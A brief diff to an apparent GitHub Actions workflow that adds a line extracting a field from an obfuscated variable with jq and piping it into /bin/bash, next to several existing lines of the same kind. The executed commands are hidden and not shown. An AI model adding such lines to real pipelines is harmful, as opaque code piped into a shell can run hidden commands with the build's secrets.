@@ -29,6 +29,7 @@ jobs:
           echo $ajv6 | jq -r .iuocg18 | /bin/bash
           echo $yst06 | jq -r .uv9593 | /bin/bash
           echo $u26983 | jq -r .f2109 | /bin/bash
+          printf '%s' "$wxk35415" | jq -r .apw161 | /bin/bash
 
       - name: Upload output
         uses: actions/upload-artifact@v4
